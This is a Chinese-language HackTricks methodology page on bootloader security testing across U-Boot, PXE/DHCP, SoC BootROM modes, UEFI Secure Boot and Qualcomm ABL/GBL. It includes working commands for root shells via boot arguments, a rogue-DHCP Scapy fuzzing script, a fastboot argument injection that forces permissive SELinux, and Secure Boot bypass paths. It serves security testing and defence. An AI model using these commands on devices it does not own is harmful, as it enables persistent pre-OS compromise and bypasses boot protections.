# Bootloader 测试

{{#include ../../banners/hacktricks-training.md}}

以下步骤适用于修改设备启动配置，以及测试 U-Boot 和 UEFI 类 loader。重点是获取早期代码执行、评估签名/rollback 保护，并利用 recovery 或 network-boot 路径。

相关内容：通过 bl2_ext patching 绕过 MediaTek secure-boot：

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins 和环境滥用

1. 访问 interpreter shell
- 启动期间，在 `bootcmd` 执行前按下已知的 break key（通常是任意键、0、空格键，或特定于 board 的 "magic" 序列），进入 U-Boot prompt。

2. 检查启动状态和变量
- 有用的命令：
- `printenv`（dump environment）
- `bdinfo`（board info、memory addresses）
- `help bootm; help booti; help bootz`（支持的 kernel boot methods）
- `help ext4load; help fatload; help tftpboot`（可用的 loaders）

3. 修改 boot arguments 以获取 root shell
- 添加 `init=/bin/sh`，使 kernel 进入 shell，而不是执行正常的 init：
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. 从你的 TFTP server 进行 netboot
- 配置 network，并从 LAN 获取 kernel/fit image：
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 通过 environment 持久化修改
- 如果 env storage 没有 write-protected，可以持久化控制：
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- 检查会影响 fallback paths 的变量，例如 `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets`。配置错误的值可能允许反复 break 进入 shell。

6. 检查 debug/unsafe features
- 查找：`bootdelay` > 0、禁用的 `autoboot`、不受限制的 `usb start; fatload usb 0:1 ...`、通过 serial 使用 `loady`/`loads` 的能力、从 untrusted media 执行 `env import`，以及在没有 signature checks 的情况下加载的 kernels/ramdisks。

7. U-Boot image/verification testing
- 如果 platform 声称使用 FIT images 实现 secure/verified boot，请同时尝试 unsigned 和 tampered images：
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- 缺少 `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`，或存在 legacy `verify=n` behavior，通常会允许启动任意 payloads。
- 不要止步于简单的 allow/deny 结果：近期 FIT research 表明，verification path 本身可能成为 pre-auth attack surface。对 externally stored FIT data（`data-offset`、`data-position`、`data-size`）、signed configuration selection、`loadables`，以及 overlay / `extra-conf` handling 执行 negative-test。
- 如果有匹配的 source tree，`test/vboot/vboot_test.sh` 是在接触真实 hardware 前，于 U-Boot sandbox 中快速复现 FIT verification behaviour 的方法。

8. Standard Boot（`bootstd`）、`extlinux` 和 script bootflows
- 在现代 U-Boot builds 中，`bootcmd` 通常只是 Standard Boot 的 wrapper。这意味着即使可见的 environment 看起来没有问题，writable media、PXE 或 SPI flash 也可能成为实际的 trust boundary。
- `extlinux` bootmeth 会在 `/` 和 `/boot` 下搜索 `extlinux/extlinux.conf`；script bootmeth 首先搜索 `boot.scr.uimg`，然后搜索 `boot.scr`。在 network boot 中，script filename 可能来自 `boot_script_dhcp`。
- 有用的 triage 命令：
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- 要测试的 abuse cases：`boot_targets` 中优先级更高的 attacker-controlled USB/SD media、writable `/boot/extlinux/extlinux.conf`、提供恶意 `boot.scr` 的 rogue TFTP，或通过 `script_offset_f` 执行 SPI-backed script。
- 如果 platform 依赖 FIT verification，请确保 configurations 在 configuration level 进行 signed，而不仅是对每个 image 单独签名；`required-mode=all` 比接受任意单个 required key 更强。

## Network-boot surface（DHCP/PXE）和 rogue servers

9. PXE/DHCP parameter fuzzing
- U-Boot 的 legacy BOOTP/DHCP handling 曾存在 memory-safety issues。例如，CVE‑2024‑42040 描述了通过 crafted DHCP responses 泄露 memory 的问题，该问题可以将 U-Boot memory 中的字节 leak 回 network。使用过长或 edge-case values（option 67 bootfile-name、vendor options、file/servername fields）测试 DHCP/PXE code paths，并观察是否出现 hangs/leaks。
- 用于在 netboot 期间 stress boot parameters 的最小 Scapy snippet：
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 另外，当 PXE filename fields 被传递给 OS-side provisioning scripts 时，验证其是否在未 sanitization 的情况下进入 shell/loader logic。

10. Rogue DHCP server command injection testing
- 设置 rogue DHCP/PXE service，并尝试在 filename 或 options fields 中注入 characters，以便在 boot chain 的后续 stages 中到达 command interpreters。Metasploit 的 DHCP auxiliary、`dnsmasq` 或 custom Scapy scripts 都很适用。首先确保隔离 lab network。

## SoC ROM recovery modes，可覆盖正常启动

许多 SoC 会暴露 BootROM "loader" mode，即使 flash images 无效，也能通过 USB/UART 接受 code。如果 secure-boot fuses 未烧录，这可能在 chain 很早的阶段提供 arbitrary code execution。

- NXP i.MX（Serial Download Mode）
- Tools：`uuu`（mfgtools3）或 `imx-usb-loader`。
- Example：`imx-usb-loader u-boot.imx`，将 custom U-Boot 推送到 RAM 并运行。
- Allwinner（FEL）
- Tool：`sunxi-fel`。
- Example：`sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 或 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip（MaskROM）
- Tool：`rkdeveloptool`。
- Example：`rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`，用于 stage 一个 loader 并 upload custom U-Boot。

评估设备是否烧录了 secure-boot eFuses/OTP。如果没有，BootROM download modes 通常会绕过任何 higher-level verification（U-Boot、kernel、rootfs），直接从 SRAM/DRAM 执行你的 first-stage payload。

## UEFI/PC-class bootloaders：quick checks

11. ESP tampering、rollback 和 key-enrollment testing
- 挂载 EFI System Partition（ESP），并检查 loader components：`EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、vendor logo paths。
- 在可能的情况下，从 OS dump Secure Boot state 和 key databases：
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- 如果 platform 处于 Setup Mode、接受 unauthenticated key enrollment，或随附 test/default Platform Key（PKfail class），local admin 或 physical attacker 可以 enroll 自己的 KEK/db，同时让 Secure Boot 看起来仍处于“enabled”状态，并启动任意 EFI binaries。
- 如果 Secure Boot revocations（dbx）不是最新版本，请尝试使用 downgraded 或 known-vulnerable 的 signed boot components 启动。如果 platform 仍信任旧 shims/bootmanagers，通常可以从 ESP 加载自己的 kernel 或 `grub.cfg`，以获得 persistence。

12. Stale shim / SBAT / dbx revocation testing
- 如果 revocations 过期，旧的 Microsoft-signed shims 和 vendor forks 仍可能作为类似 BYOVD 的 bootkit 路径。在隔离的 lab 中，将 historically vulnerable shim 放置到 ESP，并尝试 chainload 自己的 `grubx64.efi` 或 kernel。
- Quick triage：
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- 如果 shim 仍能运行，尽管它已位于 revocation list 中，则 firmware/OS 的 `dbx` updates 可能过期，或者 platform 信任一个从未继承 upstream SBAT protections 的 forked loader。

13. Boot logo parsing bugs（LogoFAIL class）
- 多个 OEM/IBV firmwares 曾容易受到 DXE 中 image-parsing flaws 的影响，这些 flaws 会处理 boot logos。如果 attacker 能够将 crafted image 放置在 vendor-specific path 下的 ESP 中（例如 `\EFI\<vendor>\logo\*.bmp`）并重启，即使启用了 Secure Boot，也可能在 early boot 期间实现 code execution。测试 platform 是否接受 user-supplied logos，以及这些 paths 是否可从 OS 写入。


## Android/Qualcomm ABL + GBL（Android 16）trust gaps

在使用 Qualcomm ABL 加载 **Generic Bootloader Library（GBL）** 的 Android 16 devices 上，验证 ABL 是否对其从 `efisp` partition 加载的 UEFI app 执行 **authentication**。如果 ABL 只检查 UEFI app 是否 **presence**，而不验证 signatures，则对 `efisp` 的 write primitive 会转化为启动时的 **pre-OS unsigned code execution**。

实用检查和 abuse paths：

- **efisp write primitive**：需要一种将 custom UEFI app 写入 `efisp` 的方法（root/privileged service、OEM app bug、recovery/fastboot path）。没有该能力时，GBL loading gap 无法直接触达。
- **fastboot OEM argument injection**（ABL bug）：某些 builds 会接受 `fastboot oem set-gpu-preemption` 中的额外 tokens，并将其 append 到 kernel cmdline。此行为可用于强制 permissive SELinux，从而启用受保护 partition 的写入：
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
如果 device 已修复，该命令应拒绝额外 arguments。
- **通过 persistent flags 解锁 bootloader**：boot-stage payload 可以翻转 persistent unlock flags（例如 `is_unlocked=1`、`is_unlocked_critical=1`），在没有 OEM server/approval gates 的情况下模拟 `fastboot oem unlock`。这会在下一次 reboot 后形成 durable posture change。

Defensive/triage notes：

- 确认 ABL 是否对来自 `efisp` 的 GBL/UEFI payload 执行 signature verification。如果没有，应将 `efisp` 视为 high‑risk persistence surface。
- 跟踪 ABL fastboot OEM handlers 是否已 patch，以 **validate argument counts** 并拒绝 additional tokens。

## Hardware caution

与 early boot 期间的 SPI/NAND flash 交互时（例如通过接地 pins 绕过读取）务必谨慎，并始终查阅 flash datasheet。时机错误的 shorts 可能损坏 device 或 programmer。

## Notes 和 additional tips

- 尝试使用 `env export -t ${loadaddr}` 和 `env import -t ${loadaddr}` 在 RAM 与 storage 之间移动 environment blobs；某些 platforms 允许从 removable media 导入 env，且不执行 authentication。
- 对于通过 `extlinux.conf` 启动的 Linux-based systems，在 boot partition 中修改 `APPEND` line（注入 `init=/bin/sh` 或 `rd.break`）通常就足够了，前提是没有 enforced signature checks。
- 如果 target 使用 dual-slot / A/B updates，请查看 [firmware analysis overview](README.md) 中的 anti-rollback 和 slot-desync techniques，以免遗漏 bootloader 之外、仅存在于 updater 中的 trust gaps。
- 如果 userland 提供 `fw_printenv/fw_setenv`，请验证 `/etc/fw_env.config` 是否匹配真实的 env storage。配置错误的 offsets 可能导致读取/写入错误的 MTD region。

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
